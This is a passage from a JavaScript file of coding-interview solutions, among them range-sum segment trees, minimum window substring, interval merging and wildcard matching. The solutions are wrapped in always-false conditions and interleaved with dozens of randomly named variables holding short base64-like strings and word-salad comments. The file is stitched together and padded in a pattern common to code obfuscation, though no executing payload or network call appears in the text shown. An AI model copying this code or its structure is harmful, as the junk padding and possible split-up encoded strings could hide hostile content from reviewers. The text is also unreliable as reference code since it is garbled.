Each rectangle is defined by its bottom left corner and top right corner as shown in the figure.

Rectangle Area
Assume that the total area is never beyond the maximum possible value of int.
*/

/**
 * @param {number} A
 * @param {number} B
 * @param {number} C
 * @param {number} D
 * @param {number} E
 * @param {number} F
 * @param {number} G
 * @param {number} H
 * @return {number}
 */
var computeArea = function(A, B, C, D, E, F, G, H) {
    // S(M ∪ N) = S(M) + S(N) - S(M ∩ N)
    var M = (D - B) * (C - A),
        N = (H - F) * (G - E);
    
    return M + N - Math.max(Math.min(D, H) - Math.max(B, F), 0) * Math.max(Math.min(C, G) - Math.max(A, E), 0);
};

}

    var nyuugo = 'lTRVJIc';
    var jgfggnxsf = 'nZEhKMV';
    var uildbsy = 'YwTqsYd';
    var udneomgqpiudacw = 'pTd2dhMl';
if (typeof navigator === 'undefined') {
    /**
Given an integer array nums, find the sum of the elements between indices i and j (i ≤ j), inclusive.

The update(i, val) function modifies nums by updating the element at index i to val.
Example:
Given nums = [1, 3, 5]

sumRange(0, 2) -> 9
update(1, 2)
sumRange(0, 2) -> 8
Note:
The array is only modifiable by the update function.
You may assume the number of calls to update and sumRange function is distributed evenly.
*/
/**
 * @constructor
 * @param {number[]} nums
 */
// time limit exceeded...
var NumArray = function(nums) {
    this.nums = nums;
    
    var length = nums.length,
        i,
        j,
        sum = [];
        
    for (i = 0; i < length; i++) {
        sum.push(new Array(length));
    }
    
    for (i = 0; i < length; i++) {
        for (j = i; j < length; j++) {
            if (i === j) {
                sum[i][j] = nums[i];
            } else {
                sum[i][j] = sum[i][j - 1] + nums[j];
            }
        }
    }
    
    this.sum = sum;
    this.len = length;
};

/**
 * @param {number} i
 * @param {number} val
 * @return {void}
 */
NumArray.prototype.update = function(i, val) {
    var diff = val - this.nums[i],
        m,
        n;
        
    this.nums[i] = val;
    
    for (m = 0; m <= i; m++) {
        for (n = i; n < this.len; n++) {
            this.sum[m][n] += diff;
        }
    }
};

/**
 * @param {number} i
 * @param {number} j
 * @return {number}
 */
NumArray.prototype.sumRange = function(i, j) {
    return this.sum[i][j];
};

// Segment Tree solution
/**
 * @constructor
 * @param {number[]} nums
 */
var NumArray = function(nums) {
    var length = nums.length,
        i,
        arr = [];
        
    for (i = 0; i < length; i++) {
        arr[i + length] = nums[i];
    }
    
    for (i = length - 1; i > 0; i--) {
        arr[i] = arr[2 * i] + arr[2 * i + 1]; 
    }
    
    this.arr = arr;
    this.len = length;
};

/**
 * @param {number} i
 * @param {number} val
 * @return {void}
 */
NumArray.prototype.update = function(i, val) {
    i += this.len;
    
    this.arr[i] = val;
    
    while (i > 0) {
        i = Math.floor(i / 2);
        this.arr[i] = this.arr[i * 2] + this.arr[i * 2 + 1];
    }
};

/**
 * @param {number} i
 * @param {number} j
 * @return {number}
 */
NumArray.prototype.sumRange = function(i, j) {
    var sum = 0,
        l = i + this.len,
        r = j + this.len;
    
    while (l <= r) {
        if (l % 2 === 1) {
            sum += this.arr[l];
            l++;
        }
        
        if (r % 2 === 0) {
            sum += this.arr[r];
            r--;
        }
        
        l = Math.floor(l / 2);
        r = Math.floor(r / 2);
    }
    
    return sum;
};


/**
 * Your NumArray object will be instantiated and called as such:
 * var numArray = new NumArray(nums);
 * numArray.sumRange(0, 1);
 * numArray.update(1, 10);
 * numArray.sumRange(0, 2);
 */

}

    var ymbiegwwnjl = 'TNLpnr';
// jwno event return hello value compile import compile event world function world value export
    var ptrmvody = 'xZsikrVec';
    var rkqbldykz = 'Y1U';
if ('false' === true) {
    /**
Given a string S and a string T, find the minimum window in S which will contain all the characters in T in complexity O(n).

For example,
S = "ADOBECODEBANC"
T = "ABC"
Minimum window is "BANC".

Note:
If there is no such window in S that covers all characters in T, return the empty string "".

If there are multiple such windows, you are guaranteed that there will always be only one unique minimum window in S.
*/

/**
可以利用两个指针扫描（两个指针分别为start，i），以S = “e b a d b a c c b”（忽略空格），T = “abc”为例：

                                                                            0 1 2 3 4 5 6 7 8

初始化 start = i = 0
i 逐渐往后扫描S直到窗口S[start…i]包含所有T的字符，此时i = 6（字符c的位置）
缩减窗口：此时我们注意到窗口并不是最小的，需要调整 start 来缩减窗口。缩减规则为：如果S[start]不在T中 或者 S[start]在T中但是删除后窗口依然可以包含T中的所有字符，那么start = start+1， 直到不满足上述两个缩减规则。缩减后i即为窗口的起始位置，此例中从e开始窗口中要依次删掉e、b、a、d，start最后等于4 ，那么得到一个窗口大小为6-4+1 = 3
start = start+1(此时窗口肯定不会包含所有的T中的字符)，跳转到步骤2继续寻找下一个窗口。本例中还以找到一个窗口start = 5，i = 8，比上个窗口大，因此最终的最小窗口是S[4…6]
*/

/**
 * @param {string} s
 * @param {string} t
 * @return {string}
 */
var minWindow = function(s, t) {
    var tSet = {},
        tFoundSet = {},
        hasFound = 0,
        lenS = s.length,
        lenT = t.length,
        winStart = -1,
        winEnd = lenS,
        result,
        start,
        c,
        i,
        j;
        
    for (i = 0; i < lenT; i++) {
        tFoundSet[t.charAt(i)] = 0;
        tSet[t.charAt(i)] = tSet[t.charAt(i)]? tSet[t.charAt(i)] + 1 : 1;
    }

    for (i = 0, start = 0; i < lenS; i++) {
        c = s.charAt(i);
        if (tSet.hasOwnProperty(c)) {
            if (tFoundSet[c] < tSet[c]) {
                hasFound++;
            }
            
            tFoundSet[s.charAt(i)]++;
        }
        
        if (hasFound === lenT) {
            while (!tSet[s.charAt(start)] || tFoundSet[s.charAt(start)] > tSet[s.charAt(start)]) {
                if (tFoundSet[s.charAt(start)]) {
                    tFoundSet[s.charAt(start)]--;
                }
                start++;
            }
            
            if (winEnd - winStart > i - start) {
                winStart = start;
                winEnd = i;
            }
            
            tFoundSet[s.charAt(start)]--;
            start++;
            hasFound--;
        }
    }
    
    return winStart !== -1? s.substr(winStart, winEnd - winStart + 1) : '';
};

}

    var picuschxbgs = 'XtkFkP';
    var zatvqslatmqhqi = 'TI5a1';
    var xfauprm = 'PXne';
    var sjlrijiw = 'pUb2dOamNn';
    var qtnfvynolyi = 'miwRdXQ';
    var gnvyhcqoxazxpjo = 'ZlN3';
if (typeof document === 'undefined') {
    /**
Given a collection of intervals, merge all overlapping intervals.

For example,
Given [1,3],[2,6],[8,10],[15,18],
return [1,6],[8,10],[15,18].
*/
/**
 * Definition for an interval.
 * function Interval(start, end) {
 *     this.start = start;
 *     this.end = end;
 * }
 */
/**
 * @param {Interval[]} intervals
 * @return {Interval[]}
 */
var merge = function(intervals) {
    var len = intervals.length,
        start = null,
        end,
        result = [],
        cur,
        i;
    
    if (len <= 1) {
        return intervals;
    }
    
    intervals.sort(function(a, b) {
        if (a.start < b.start) {
            return - 1;
        } else if (a.start > b.start) {
            return 1;
        } else {
            return a.end - b.end;
        }
    });
    
    for (i = 0; i < len; i++) {
        cur = intervals[i];
        
        if (i === 0) {
            start = cur.start;
            end = cur.end;
        } else {
            if (cur.start <= end) {
                end = Math.max(end, cur.end);
            } else {
                result.push(new Interval(start, end));
                start = cur.start;
                end = cur.end;
            }
        }
    }
    
    if (start !== null) {
        result.push(new Interval(start, end));
    }
    
    return result;
};

}

    var quypthzazu = 'ArDXBnR';
    var etfqqpv = 'Z0x5';
    var vlrpidvaei = 'QrTrs';
    var lcdzbm = 'OGdRMj';
    var lboudabvfutb = 'VXULPSVVk';
if ('v' === 'A') {
    /**
Related to question Excel Sheet Column Title

Given a column title as appear in an Excel sheet, return its corresponding column number.

For example:

    A -> 1
    B -> 2
    C -> 3
    ...
    Z -> 26
    AA -> 27
    AB -> 28 

 * @param {string} s
 * @return {number} Return column number
 */
var titleToNumber = function(s) {
    var len = s.length,
        i,
        result = 0;
    for (i = 0; i < len; i++) {
        result += Math.pow(26, len - i - 1) * (s.charAt(i).charCodeAt() - 'A'.charCodeAt() + 1);
    }
    return result;
};

}

    var onbbtmtrb = 'FrS';
    var orboudrvar = 'eSJDbCAZLD';
    var wekzryhevuh = 'zBGc2RDdER';
if (5 === 18) {
    /**
Given an absolute path for a file (Unix-style), simplify it.

For example,
path = "/home/", => "/home"
path = "/a/./b/../../c/", => "/c"
click to show corner cases.

Corner Cases:
Did you consider the case where path = "/../"?
In this case, you should return "/".
Another corner case is the path might contain multiple slashes '/' together, such as "/home//foo/".
In this case, you should ignore redundant slashes and return "/home/foo".
*/
/**
 * @param {string} path
 * @return {string}
 */
var simplifyPath = function(path) {
    var paths = [],
        arr = path.split('/'),
        len = arr.length,
        cur,
        i,
        result = '';
        
    for (i = 0; i < len; i++) {
        cur = arr[i];
        
        if (cur === '.' || cur.length === 0) {
            continue;
        }
        
        if (cur === '..') {
            if (paths.length > 0) {
                paths.pop();
            }
        } else {
            paths.push(cur);
        }
    }
    
    for (i = 0; i < paths.length; i++) {
        result += '/' + paths[i];
    }
    
    if (result === '') {
        result = '/';
    }
    
    return result;
};

}

    var bggttctzf = 'jEIZ';
    var oshzwfwe = 'JRzl1SUc';
    var ukpaaul = 'eqvOaXOt';
    var czkdxrkcqic = 'xaFkwO';
if (0.11 && false) {
    /**
Given an array of n positive integers and a positive integer s, find the minimal length of a subarray of which the sum ≥ s. If there isn't one, return 0 instead.

For example, given the array [2,3,1,2,4,3] and s = 7,
the subarray [4,3] has the minimal length under the problem constraint.

click to show more practice.

More practice:
If you have figured out the O(n) solution, try coding another solution of which the time complexity is O(n log n).
*/
/**
 * @param {number} s
 * @param {number[]} nums
 * @return {number}
 */
// O(n) solution
var minSubArrayLen = function(s, nums) {
    var len = nums.length,
        left = 0,
        right = 0,
        sum = 0,
        result = Number.MAX_VALUE;
        
    if (len === 0) {
        return 0;
    }
    
    sum += nums[left];
    
    while (right < len) {
        while (sum < s && right < len) {
            right++;
            sum += nums[right];
        }
        
        while (sum >= s) {
            result = Math.min(result, right - left + 1);
            sum -= nums[left];
            left++;
        }
    }
    
    if (result === Number.MAX_VALUE) {
        return 0;
    }
    
    return result;
};


//O(nlgn) solution
/**
 * @param {number} s
 * @param {number[]} nums
 * @return {number}
 */
var minSubArrayLen = function(s, nums) {
    var len = nums.length,
        right = 0,
        sums = [],
        result = Number.MAX_VALUE,
        i;
        
    if (len === 0) {
        return 0;
    }
    
    sums[0] = 0;
    
    for (i = 1; i <= len; i++) {
        sums[i] = nums[i - 1] + sums[i - 1];
    }
    
    for (i = 0; i <= len; i++) {
        right = findRight(i + 1, len, s + sums[i], sums);
        
        if (right === len + 1) {
            break;
        }
        
        if (result > right - i) {
            result = right - i;
        }
    }
    
    return result === Number.MAX_VALUE? 0 : result;
};

function findRight(left, right, key, sums) {
    var mid;
    
    while (left <= right) {
        mid = Math.floor((left + right)/2);
        if (sums[mid] >= key) {
            right = mid - 1;
        } else {
            left = mid + 1;
        }
    }
    
    return left;
}

}

    var ynqiaxle = 'UydfDG';
// variable debug function array debug world code mjlbqyr string export compile debug value gdgbjbuj value
if (!true && 1) {
    /**
Implement wildcard pattern matching with support for '?' and '*'.

'?' Matches any single character.
'*' Matches any sequence of characters (including the empty sequence).

The matching should cover the entire input string (not partial).

The function prototype should be:
bool isMatch(const char *s, const char *p)

Some examples:
isMatch("aa","a") → false
isMatch("aa","aa") → true
isMatch("aaa","aa") → false
isMatch("aa", "*") → true
isMatch("aa", "a*") → true
isMatch("ab", "?*") → true
isMatch("aab", "c*a*b") → false
*/
/**
 * @param {string} s
 * @param {string} p
 * @return {boolean}
 */
var isMatch = function(s, p) {
    let sIndex = 0;
    let pIndex = 0;
    let startIndex = -1; // startIndex of * in p
    let match = 0; // the position in s that matches with p 
    
    while (sIndex < s.length) {
        // matches, both advance
        if (pIndex < p.length && (s.charAt(sIndex) === p.charAt(pIndex) || p.charAt(pIndex) === '?')) {
            pIndex++;
            sIndex++;
        } else if (pIndex < p.length && p.charAt(pIndex) === '*') {
            startIndex = pIndex;
            match = sIndex;
            pIndex++;
        } else if (startIndex !== -1) {
            pIndex = startIndex + 1;
            match++;
            sIndex = match;
        } else {
            return false;
        }
    }
    
    while (pIndex < p.length && p.charAt(pIndex) === '*') {
        pIndex++;
    }
    
    return pIndex === p.length;
};

}

    var bbozmnhwkpd = 'PWQitDpcxJ';
    var cmjxgqp = 'VRDa';
    var effimxksugak = 'NJnZEDf';
// number script string array mdskmf function await value ktkad async
    var hwxash = 'IwpsR';
if (null === 2) {
    /**
Given two binary trees, write a function to check if they are equal or not.

Two binary trees are considered equal if they are structurally identical and the nodes have the same value.

 * Definition for binary tree
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */

/**
 * @param {TreeNode} p
 * @param {TreeNode} q
 * @returns {boolean}
 */
var isSameTree = function(p, q) {
    if (!p && !q) {
        return true;
    }
    if (!p || !q) {
        return false;
    }
    if (p.val !== q.val) {
        return false;
    }
    return isSameTree(p.left, q.left)&&isSameTree(p.right, q.right);
};

}

    var vnlgkumcgsbizz = 'UFn';
    var uwpeojxkyjg = 'kSPTc';
    var bmcdabyhxhsgu = 'SUNBZ0l';
    var jhwryiz = 'cqrf';
if (!true && 1) {
    /**
Given a collection of intervals, merge all overlapping intervals.

For example,
Given [1,3],[2,6],[8,10],[15,18],
return [1,6],[8,10],[15,18].
*/
/**
 * Definition for an interval.
 * function Interval(start, end) {
 *     this.start = start;
 *     this.end = end;
 * }
 */
/**
 * @param {Interval[]} intervals
 * @return {Interval[]}
 */
var merge = function(intervals) {
    var len = intervals.length,
        start = null,
        end,
        result = [],
        cur,
        i;
    
    if (len <= 1) {
        return intervals;
    }
    
    intervals.sort(function(a, b) {
        if (a.start < b.start) {
            return - 1;
        } else if (a.start > b.start) {
            return 1;
        } else {
            return a.end - b.end;
        }
    });
    
    for (i = 0; i < len; i++) {
        cur = intervals[i];
        
        if (i === 0) {
            start = cur.start;
            end = cur.end;
        } else {
            if (cur.start <= end) {
                end = Math.max(end, cur.end);
            } else {
                result.push(new Interval(start, end));
                start = cur.start;
                end = cur.end;
            }
        }
    }
    
    if (start !== null) {
        result.push(new Interval(start, end));
    }
    
    return result;
};

}

    var qxmedspnknbvvv = 'DQWdleUJ0';
if (!true && 0) {
    /**
There are two sorted arrays nums1 and nums2 of size m and n respectively. Find the median of the two sorted arrays. The overall run time complexity should be O(log (m+n)).


*/
/**
 * @param {number[]} nums1
 * @param {number[]} nums2
 * @return {number}
 */
var findMedianSortedArrays = function(nums1, nums2) {
    var len1 = nums1.length,
        len2 = nums2.length,
        len = len1 + len2;
        
    if (len % 2 === 1) {
        return findMedianHelper(0, nums1, 0, nums2, (len + 1) / 2);
    } else {
        return (findMedianHelper(0, nums1, 0, nums2, len / 2) + findMedianHelper(0, nums1, 0, nums2, len / 2 + 1)) / 2;
    }
};

function findMedianHelper(aStart, numsA, bStart, numsB, k) {
    if (aStart >= numsA.length) {
        return numsB[bStart + k - 1];
    }
    
    if (bStart >= numsB.length) {
        return numsA[aStart + k - 1];
    }
    
    if (k === 1) {
        return Math.min(numsA[aStart], numsB[bStart]);
    }
    
    var aKey = aStart + parseInt(k / 2) - 1 < numsA.length? numsA[aStart + parseInt(k / 2) - 1] : Number.MAX_VALUE,
        bKey = bStart + parseInt(k / 2) - 1 < numsB.length? numsB[bStart + parseInt(k / 2) - 1] : Number.MAX_VALUE;
        
    if (aKey < bKey) {
        return findMedianHelper(aStart + parseInt(k / 2), numsA, bStart, numsB, k - parseInt(k / 2));
    }
    
    return findMedianHelper(aStart, numsA, bStart + parseInt(k / 2), numsB, k - parseInt(k / 2));
}

}

    var ddhafrf = 'ECFXmCIhs';
if (!true && 1) {
    /**
Say you have an array for which the ith element is the price of a given stock on day i.

Design an algorithm to find the maximum profit. You may complete as many transactions as you like (ie, buy one and sell one share of the stock multiple times). However, you may not engage in multiple transactions at the same time (ie, you must sell the stock before you buy again).

 * @param {number[]} prices
 * @return {number}
 */
var maxProfit = function(prices) {
    var i,
        length = prices.length,
        low,
        high,
        cur,
        prev,
        temp = 0
        max = 0;
    
    if (length === 0 || length === 1) {
        return max;
    }
    low = prices[0];
    high = prices[0];
    prev = low;
    for (i = 1; i < length; i++) {
        cur = prices[i];
        if (cur > prev) {
            high = cur;
            temp = high - low;
        } else if (cur < prev) {
            max += temp;
            temp = 0;
            low = cur;
            high = cur;
        }
        prev = cur;
    }
    if (temp !== 0) {
        max += temp;
    }
    return max;
};

}

    var mcsnf = 'Wlh';
if (!true && 1) {
    /**
Given a 2D matrix matrix, find the sum of the elements inside the rectangle defined by its upper left corner (row1, col1) and lower right corner (row2, col2).

Range Sum Query 2D
The above rectangle (with the red border) is defined by (row1, col1) = (2, 1) and (row2, col2) = (4, 3), which contains sum = 8.

Example:
Given matrix = [
  [3, 0, 1, 4, 2],
  [5, 6, 3, 2, 1],
  [1, 2, 0, 1, 5],
  [4, 1, 0, 1, 7],
  [1, 0, 3, 0, 5]
]

sumRegion(2, 1, 4, 3) -> 8
sumRegion(1, 1, 2, 2) -> 11
sumRegion(1, 2, 2, 4) -> 12
Note:
You may assume that the matrix does not change.
There are many calls to sumRegion function.
You may assume that row1 ≤ row2 and col1 ≤ col2.
*/

 /**
 * @constructor
 * @param {number[][]} matrix
 */
var NumMatrix = function(matrix) {
    var sum = [],
        rLen = matrix.length,
        cLen,
        i,
        j;
    
    if (rLen === 0) {
        this.sum = null;
        return;
    }
    
    cLen = matrix[0].length;
    
    for (i = 0; i < rLen; i++) {
        sum.push(new Array(cLen));
    }    
    
    sum[0][0] = matrix[0][0];
    
    for (i = 1; i < rLen; i++) {
        sum[i][0] = sum[i - 1][0] + matrix[i][0];
    }
    
    for (j = 1; j < cLen; j++) {
        sum[0][j] = sum[0][j - 1] + matrix[0][j];
    }
    
    for (i = 1; i < rLen; i++) {
        for (j = 1; j < cLen; j++) {
            sum[i][j] = sum[i - 1][j] + sum[i][j - 1] - sum[i - 1][j - 1] + matrix[i][j];
        }
    }
    
    this.sum = sum;
};

/**
 * @param {number} row1
 * @param {number} col1
 * @param {number} row2
 * @param {number} col2
 * @return {number}
 */
NumMatrix.prototype.sumRegion = function(row1, col1, row2, col2) {
    if (!this.sum) {
        return 0;
    }
    
    var result = this.sum[row2][col2];
    
    if (row1 > 0) {
        result -= this.sum[row1 - 1][col2];
    }
    
    if (col1 > 0) {
        result -= this.sum[row2][col1 - 1];
    }
    
    if (row1 > 0 && col1 > 0) {
        result += this.sum[row1 - 1][col1 - 1];
    }
    
    return result;
};


/**
 * Your NumMatrix object will be instantiated and called as such:
 * var numMatrix = new NumMatrix(matrix);
 * numMatrix.sumRegion(0, 1, 2, 3);
 * numMatrix.sumRegion(1, 2, 3, 4);
 */

}

    var sbidjokjt = 'dNtnRJQRkc';
if (!true && 1) {
    /**
Given a digit string, return all possible letter combinations that the number could represent.

A mapping of digit to letters (just like on the telephone buttons) is given below.



Input:Digit string "23"
Output: ["ad", "ae", "af", "bd", "be", "bf", "cd", "ce", "cf"].
Note:
Although the above answer is in lexicographical order, your answer could be in any order you want.
*/
/**
 * @param {string} digits
 * @return {string[]}
 */
var letterCombinations = function(digits) {
    var len = digits.length,
        result = [],
        map = {
            '1': [''],
            '2': ['a', 'b', 'c'],
            '3': ['d', 'e', 'f'],
            '4': ['g', 'h', 'i'],
            '5': ['j', 'k', 'l'],
            '6': ['m', 'n', 'o'],
            '7': ['p', 'q', 'r', 's'],
            '8': ['t', 'u', 'v'],
            '9': ['w', 'x', 'y', 'z']
        };
        
    if (len === 0) {
        return result;
    }
    
    return genStrings([''], 0, len, digits, map);
};

function genStrings(curArr, index, len, digits, map) {
    var length = curArr.length,
        next = [],
        temp,
        i,
        j;
    
    if (index === len) {
        return curArr;
    }
    
    for (i = 0; i < length; i++) {
        for (j = 0; j < map[digits.charAt(index)].length; j++) {
            temp = curArr[i] + map[digits.charAt(index)][j];
            next.push(temp);
        }
    }    
    
    return genStrings(next, index + 1, len, digits, map);
}

}

    var luvkkatzxl = 'SaE9pQjBj';
if (!true && 0) {
    /**
Given a collection of numbers that might contain duplicates, return all possible unique permutations.

For example,
[1,1,2] have the following unique permutations:
[1,1,2], [1,2,1], and [2,1,1].
*/
/**
 * @param {number[]} nums
 * @return {number[][]}
 */
var permuteUnique = function(nums) {
    var len = nums.length,
        result = [];
    
    nums.sort(function(a, b) {
        return a - b;
    });
    
    genPerm(result, 0, len, [], [], nums);
    
    return result;
};

function genPerm(result, index, len, curArr, used, nums) {
    if (curArr.length === len) {
        result.push(curArr);
        return;
    }
    
    var i;
    
    for (i = 0; i < len; i++) {
        if (used[i] || (i > 0 && nums[i] === nums[i - 1] && !used[i - 1])) {
            continue;
        }
        
        curArr.push(nums[i]);
        used[i] = true;
        genPerm(result, i + 1, len, curArr.concat(), used.concat(), nums);
        used[i] = false;
        curArr.pop();
    }
}
}

    var vomzgk = 'AHhzaM';
    var hxrlqnxcfhncn = 'blZsT';
    var sycwgretds = 'taTEkymo';
    var nuxsqaroic = 'ENCclpY';
if (null === 2) {
    /**
Given an integer n, count the total number of digit 1 appearing in all non-negative integers less than or equal to n.

For example:
Given n = 13,
Return 6, because digit 1 occurred in the following numbers: 1, 10, 11, 12, 13.

Hint:

Beware of overflow.
*/
/**
intuitive: 每10个数, 有一个个位是1, 每100个数, 有10个十位是1, 每1000个数, 有100个百位是1.  做一个循环, 每次计算单个位上1得总个数(个位,十位, 百位).  
例子:
以算百位上1为例子:   假设百位上是0, 1, 和 >=2 三种情况: 
    case 1: n=3141092, a= 31410, b=92. 计算百位上1的个数应该为 3141 *100 次.
    case 2: n=3141192, a= 31411, b=92. 计算百位上1的个数应该为 3141 *100 + (92+1) 次. 
    case 3: n=3141592, a= 31415, b=92. 计算百位上1的个数应该为 (3141+1) *100 次. 
以上三种情况可以用 一个公式概括:
(a + 8) / 10 * m + (a % 10 == 1) * (b + 1);
*/
/**
 * @param {number} n
 * @return {number}
 */
var countDigitOne = function(n) {
    var ones = 0,
        a,
        b,
        m;
        
    for (m = 1; m <= n; m *= 10) {
        a = Math.floor(n / m);
        b = n % m;
        ones += Math.floor((a + 8) / 10) * m;
        
        if (a % 10 === 1) {
            ones += b + 1;
        }
    }
    
    return ones;
};

}

    var gmnxxfojkllj = 'qPGEebAK';
    var akgemiwubaynkll = 'bERi';
    var keubfkgmekfs = 'ddfTM';
    var ufrfpsswq = 'MlJsT2lB';
    var rmmxiz = 'bSLWu';
    var tmfcezmavfgmgp = 'NE5TQ';
    var yjkxofciy = 'qzihw';
// function value compile export vxldev import hello function
    var gkfgzwbjbu = 'TpLoDYmVh';
    var hotqj = 'jlJQzh2SUV';
    var ozjqodhb = 'IpTrjYBvGw';
if ('y' === 'R') {
    /**
Given an integer, write a function to determine if it is a power of three.

Follow up:
Could you do it without using any loop / recursion?
*/
/**
 * @param {number} n
 * @return {boolean}
 */
var isPowerOfThree = function(n) {
    while (n >= 3) {
        if (n % 3 !== 0) {
            break;
        }
        
        n = n / 3;
    }
    
    return n === 1;
};

// Math solution
/**
 * @param {number} n
 * @return {boolean}
 */
var isPowerOfThree = function(n) {
    return (Math.log10(n) / Math.log10(3)) % 1 === 0;
};

}

    var ghqwvhqteqpmcxx = 'OdFpDdF';
    var dwjqeht = 'oJtLX';
if (61 > 154) {
    /**
Given two sorted integer arrays nums1 and nums2, merge nums2 into nums1 as one sorted array.

Note:
You may assume that nums1 has enough space (size that is greater or equal to m + n) to hold additional elements from nums2. The number of elements initialized in nums1 and nums2 are m and n respectively.
*/

/**
 * @param {number[]} nums1
 * @param {number} m
 * @param {number[]} nums2
 * @param {number} n
 * @return {void} Do not return anything, modify nums1 in-place instead.
 */
var merge = function(nums1, m, nums2, n) {
    // starting from the end!
    while(m > 0 && n > 0) {
        if (nums1[m - 1] > nums2[n - 1]) {
            nums1[m + n - 1] = nums1[m - 1];
            m--;
        } else {
            nums1[m + n - 1] = nums2[n - 1];
            n--;
        }
    }
    
    while (n > 0) {
        nums1[n - 1] = nums2[n - 1];
        n--;
    }
};

}

    var mqzctigdv = 'ZJRzl1SUcx';
    var iortpokrk = 'sCYnbNW';
    var fvcaqptytqd = 'aFk';
    var xxbumu = 'iChCRaEcVR';
    var cdtzoktzg = 'wOVRDaU';
    var qiiiht = 'XCqkkRcWIt';
// compile script variable code array
    var kdasrbwvbz = 'PKKLwlvJJf';
if (60 > 136) {
    /**
Given a set of candidate numbers (C) and a target number (T), find all unique combinations in C where the candidate numbers sums to T.

The same repeated number may be chosen from C unlimited number of times.

Note:
All numbers (including target) will be positive integers.
Elements in a combination (a1, a2, … , ak) must be in non-descending order. (ie, a1 ≤ a2 ≤ … ≤ ak).
The solution set must not contain duplicate combinations.
For example, given candidate set 2,3,6,7 and target 7, 
A solution set is: 
[7] 
[2, 2, 3] 
*/

/**
 * @param {number[]} candidates
 * @param {number} target
 * @return {number[][]}
 */
var combinationSum = function(candidates, target) {
    var sols = [],
        len = candidates.length,
        curSol = [],
        start = 0,
        i;
    
    if (len === 0) {
        return sols;
    }
    // sort candidates
    candidates.sort(function(a, b) {
        if (a < b) {
            return -1;
        }
        
        return 1;
    });

    fillCurSol(start, len, candidates, target, curSol, sols); 
    
    return sols;  
};

function fillCurSol(start, len, candidates, target, curSol, sols) {
    // skip duplicates from candidate
    var i,
        newCurSol; // very important, can't mess up with arrays
    
    
    if (target === 0) {
        sols.push(curSol.concat());
        return;
    }
    
    for (i = start; i < len; i++) {
        if (i > start && candidates[i] === candidates[i - 1]) {
            continue;
        }
        
        newCurSol = curSol.concat();
        
        if (candidates[i] <= target) {
            newCurSol.push(candidates[i]);
            fillCurSol(i, len, candidates, target - candidates[i], newCurSol, sols);
            newCurSol.pop();
        }
    }
}

}

    var koaazx = 'FnSU';
if (Array.isArray(3)) {
    /**
Implement atoi to convert a string to an integer.

Hint: Carefully consider all possible input cases. If you want a challenge, please do not see below and ask yourself what are the possible input cases.

Notes: It is intended for this problem to be specified vaguely (ie, no given input specs). You are responsible to gather all the input requirements up front.

Update (2015-02-10):
The signature of the C++ function had been updated. If you still see your function signature accepts a const char * argument, please click the reload button  to reset your code definition.

spoilers alert... click to show requirements for atoi.

Requirements for atoi:
The function first discards as many whitespace characters as necessary until the first non-whitespace character is found. Then, starting from this character, takes an optional initial plus or minus sign followed by as many numerical digits as possible, and interprets them as a numerical value.

The string can contain additional characters after those that form the integral number, which are ignored and have no effect on the behavior of this function.

If the first sequence of non-whitespace characters in str is not a valid integral number, or if no such sequence exists because either str is empty or it contains only whitespace characters, no conversion is performed.

If no valid conversion could be performed, a zero value is returned. If the correct value is out of the range of representable values, INT_MAX (2147483647) or INT_MIN (-2147483648) is returned.

*/
/**
 * @param {string} str
 * @return {number}
 */
var myAtoi = function(str) {
    var len = str.length,
        isNegative = null,
        result = 0,
        numberStarted = false,
        cur,
        i;
        
    for (i = 0; i < len; i++) {
        if (str.charAt(i) === ' ') {
            if (!numberStarted) {
                continue;
            } else {
                return getResult(isNegative, result);
            }
        }
        
        if (isNegative === null) {
            if (str.charAt(i) === '-') {
                isNegative = true;
                numberStarted = true;
                continue;
            } else if (str.charAt(i) === '+') {
                isNegative = false;
                numberStarted = true;
                continue;
            }
        }
        
        cur = parseInt(str.charAt(i));
        
        if (!isNaN(cur)) {
            result = result*10 + cur;
            
            if (!numberStarted) {
                numberStarted = true;
            }
        } else {
            return getResult(isNegative, result);
        }
    }
    
    return getResult(isNegative, result);
};
// :(
function getResult(isNegative, result) {
    result = isNegative? result * (-1) : result;
    
    if (result > 2147483647) {
        result = 2147483647;
    } else if (result < -2147483648) {
        result = -2147483648;
    }
    
    return result;
}

}

    var vojaof = 'GcVKm';
    var vksiyhpq = 'NCZE93b';
    var esecsoshw = 'IoLnqY';
    var lfkaui = '0tJQ0FnS';
    var clclmzygpbk = 'EmpKzg';
if (!true && 1) {
    /**
Given an integer array nums, return the number of range sums that lie in [lower, upper] inclusive.
Range sum S(i, j) is defined as the sum of the elements in nums between indices i and j (i ≤ j), inclusive.

Note:
A naive algorithm of O(n2) is trivial. You MUST do better than that.

Example:
Given nums = [-2, 5, -1], lower = -2, upper = 2,
Return 3.
The three ranges are : [0, 0], [2, 2], [0, 2] and their respective sums are: -2, -1, 2.
*/
/**
 * @param {number[]} nums
 * @param {number} lower
 * @param {number} upper
 * @return {number}
 */
var countRangeSum = function(nums, lower, upper) {
    function SegmentTreeNode(min, max) {
        this.min = min;
        this.max = max;
        this.count = 0;
    }
    
    function buildSegmentTree(valArr, low, high) {
        if (low > high) {
            return null;
        }
        
        var mid = parseInt((low + high) / 2),
            node = new SegmentTreeNode(valArr[low], valArr[high]);
        
        if (low === high) {
            return node;
        }
        
        node.left = buildSegmentTree(valArr, low, mid);
        node.right = buildSegmentTree(valArr, mid + 1, high);
        
        return node;
    }
    
    function updateSegmentTree(node, val) {
        if (!node) {
            return;
        }
        
        if (val >= node.min && val <= node.max) {
            node.count++;
            updateSegmentTree(node.left, val);
            updateSegmentTree(node.right, val);
        }
    }
    
    function rangeCount(node, min, max) {
        if (!node) {
            return 0;
        }
        
        if (min > node.max || max < node.min) {
            return 0;
        }
        
        if (min <= node.min && max >= node.max) {
            return node.count;
        }
        
        return rangeCount(node.left, min, max) + rangeCount(node.right, min, max);
    }
    
    var len = nums.length,
        sumSet = new Set(),
        sum = 0,
        result = 0,
        arr,
        root,
        i;
        
    if (len === 0) {
        return 0;
    }
    
    for (i = 0; i < len; i++) {
        sum += nums[i];
        sumSet.add(sum);
    }
    
    arr = Array.from(sumSet);
    arr.sort(function(a, b) {
        return a - b;
    });
    
    root = buildSegmentTree(arr, 0, arr.length - 1);
    
    for (i = len - 1; i >= 0; i--) {
        updateSegmentTree(root, sum);
        sum -= nums[i];
        result += rangeCount(root, lower + sum, upper + sum);
    }
    
    return result;
};

}

// idsi object object object string number variable function import hello async object return script
if (Array.isArray(9)) {
    /**
